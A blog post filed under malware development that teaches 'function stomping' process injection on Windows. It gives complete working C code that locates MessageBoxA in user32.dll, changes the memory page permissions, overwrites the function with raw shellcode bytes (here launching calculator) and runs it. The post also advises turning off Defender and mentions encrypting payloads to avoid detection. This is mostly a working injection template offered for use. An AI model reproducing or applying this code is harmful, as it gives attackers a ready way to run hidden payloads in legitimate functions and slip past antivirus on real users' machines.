---
layout: post
title:  "Function stomping injection"
date:   2023-05-11 04:00:59 +0400
categories: malware-development
tags: [function-stomping, process-injection, malware-development, shellcode, windows]
lang: en
ref: stomping
permalink: /en/malware-development/2023/05/11/function-stomping-injection.html
description: "In this blogpost, i will talk about function stomping injection and how we can implement it."
canonical_url: "https://medium.com/@Cushz/function-stomping-injection-d2b942faa190"
---

<figure>
  <img src="/assets/img/function-stomping/1-3fFYzrqhg7S83Uz_6bXm2Q.png" alt="screenshot" loading="lazy">
</figure>

In this blogpost, i will talk about function stomping injection and how we can implement it.

\*\*It is published in 2024, not 2023

To put it in one sentence, if we overwrite any given function in memory, we can make it to run as how we want it to.

If you have used windows, you have probably heard the term of DLL. Well, DLL’s are just files which contains functions. For example, if you want to create a messagebox that will pop out in your project, you don’t have to write it from scratch, you can just use MessageBox function which can be found inside of User32.dll file. You basically import this dll file and use any functions you want from it.

Now, if we think about it, we can see that when we import this function from dll file, it has to be saved in somewhere in the memory right? if we can find that entry point in the memory, we can overwrite it as well.

But, there are some considerations. For example what if this function is used a lot by the operating system, or what if we don’t even have write or execute permissions in this memory space?

Well, most used functions such as ntdll.dll or kernel32.dll functions are risky to be used in this method as they can crash. But for the permissions part, we can just change it.

Let’s stop talking and start writing.

```c
#include<stdio.h>
#include<Windows.h>
int main()
{
  if(MessageBoxA(NULL,"this is test message box","hi",MB_OK) == 0)
    {
      printf("function failed:%d\n",GetLastError()); return 1;
    }
return 0;
}
```

<figure>
  <img src="/assets/img/function-stomping/1-rKfUtiIh7U1l5ccbq0_iAw.png" alt="screenshot" loading="lazy">
</figure>

This is basic C code which is supposed to pop out the message box.

Now, in order to modify the MessageBoxA function, we have to find its location.

```c
hModule = LoadLibrary(TARGET_DLL);
 if(hModule == NULL)
    {
      printf("[-]failed to load the library:%d\n",GetLastError());
      return 1;
    }
pAddress = GetProcAddress(hModule,TARGET_FUNC);
 if(pAddress == NULL)
    {
      printf("[-]failed to get address:%d\n",GetLastError());
      return 1;
    }
```

<figure>
  <img src="/assets/img/function-stomping/1-2MWAEWmJ3G_LnZUIZh6EKQ.png" alt="this is what your output should look like" loading="lazy">
  <figcaption>this is what your output should look like</figcaption>
</figure>

As you can see, we load our library (which is “user32.dll” in our case) and then take the function address using `GetProcAddress`.

Now, let’s just run the code and see what it really looks like in the memory. (We will use process hacker tool for further investigation, recommended to install)

<figure>
  <img src="/assets/img/function-stomping/1-uTHtnGLB27M2iRQtZZqtYw.png" alt="screenshot" loading="lazy">
</figure>

If we look in detail, we see that user32.dll is imported. Now let’s do quick recap right here.

our function is located in `7fff89c1c210` and if you know just the basics of the hex, you definitely now that it comes before `7fffc35000` . So we come to the conclusion that it is located in second part (which i have opened in the right tab as you can see).

Also one more detail is that it have READ and EXECUTE permissions. But it does not have WRITE permission so we have to add it in order to overwrite it.

For changing permissions, we will use `VirtualProtect` which is WinAPI function as well.

```c
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_READWRITE,&dwOldProtection)) // in here, you should use dwOldProtection, don't write NULL, as the function will fail
   {
       printf("[+]failed to change the permission:%d\n",GetLastError());
       return 1;
   }
```

Now, you see that we have 2 new sections between our needed memory region and they have READ permission as well.

<figure>
  <img src="/assets/img/function-stomping/1-m8JvxruuCg9mYYCAW5jVUQ.png" alt="screenshot" loading="lazy">
</figure>

Important part is to overwrite this writeable section with our shellcode.

If you don’t know what shellcode is, it is basically a byte array which is used for exploitation. In our case it is calculator. You can generate the shellcodes using metasploit, i have already generated it. Just google it and you will find it.

```c
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd" "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

we will use memcpy which will copy the memory the shellcode from the memory to the specified region.

```c
memcpy(pAddress,buf,sizeof(buf));
```

<figure>
  <img src="/assets/img/function-stomping/1--RbECTX5XaTssgGniIR5aA.png" alt="screenshot" loading="lazy">
</figure>

As you can see, our code is injected to `7fffc1c210` . But we can't execute it as we don't have Execute permissions. So, we will change it is permission.

Again we will use `VirtualProtect` but with different flag for third parameter.

```c
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_EXECUTE_READWRITE,&dwOldProtection))
    {
      printf("[-] failed to change the permission:%d\n",GetLastError());
      return 1;
    }
```

For the final step, we have to execute it. Just use the MessageBox function again and you will see that instead of messagebox, calculator appears.

```c
if(MessageBoxA(NULL,"this is test message box","hi",MB_OK) == 0)
    {
        printf("function failed:%d\n",GetLastError());
        return 1;
    }
```

Another way is that we will just create a new thread with `CreateThread` which will execute our shellcode.

```c
hThread = CreateThread(NULL,0,pAddress,NULL,0,NULL);
if(hThread == NULL)
  {
      printf("[-] failed to execute the payload:%d\n",GetLastError());
      return 1;
  }
WaitForSingleObject(hThread,INFINITE);
```

In here, you can ask me why we are using WaitForSingleObject function. It is because, after creating thread, it exits the main() function, which terminates the process. Our thread is inside this process, so effectively it will be terminated as well. For that reason, we have to say our code to wait for our thread to be executed, and THEN terminate the process. Our expected output should be the calculator.

Here is the full code.

```c
#include<stdio.h>
#include<Windows.h>
#define TARGET_DLL "user32.dll"
#define TARGET_FUNC "MessageBoxA"
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd" "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
int main()
{
HMODULE hModule = NULL;
PVOID pAddress = NULL;
DWORD dwOldProtection = NULL;
HANDLE hThread = NULL;
printf("[] press ENTER to load the dll");
getchar();
hModule = LoadLibrary(TARGET_DLL);
if(hModule == NULL)
  {
    printf("[-] failed to load the library:%d\n",GetLastError());
     return 1;
  }
pAddress = GetProcAddress(hModule,TARGET_FUNC);
if(pAddress == NULL)
{ printf("[-] failed to get address:%d\n",GetLastError());
  return 1;
}
printf("[+] Done\n");
printf("[+] Function is located at:0x%p\n",pAddress);
printf("[] Press enter to change the permission of the memory page");
getchar();
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_READWRITE,&dwOldProtection))
  {
    printf("[+] failed to change the permission:%d\n",GetLastError());
    return 1;
  }
printf("[+] Permission has successfully changed\n");
printf("[] copy your shellcode to the specified memory");
getchar();
memcpy(pAddress,buf,sizeof(buf));
if(!VirtualProtect(pAddress,sizeof(buf),PAGE_EXECUTE_READWRITE,&dwOldProtection))
  {
    printf("[-] failed to change the permission:%d\n",GetLastError());
    return 1;
  }
printf("[] press enter to run your injected code");
getchar();
hThread = CreateThread(NULL,0,pAddress,NULL,0,NULL);
if(hThread == NULL)
    {
      printf("[-] failed to execute the payload:%d\n",GetLastError());
      return 1;
    }
WaitForSingleObject(hThread,INFINITE);
// or as i have said before, run the MessageBoxA function again
return 0;
}
```

<figure>
  <img src="/assets/img/function-stomping/1-3DR0npVkPngcTydrh6CqnQ.png" alt="screenshot" loading="lazy">
</figure>

Notes:

- You should turn of your defender, otherwise it will be detected because of the shellcode. In real life, they are being encrypted and obfuscated.
- Use MSDN documentation to get better understanding of the functions.
- Feel free to give feedback
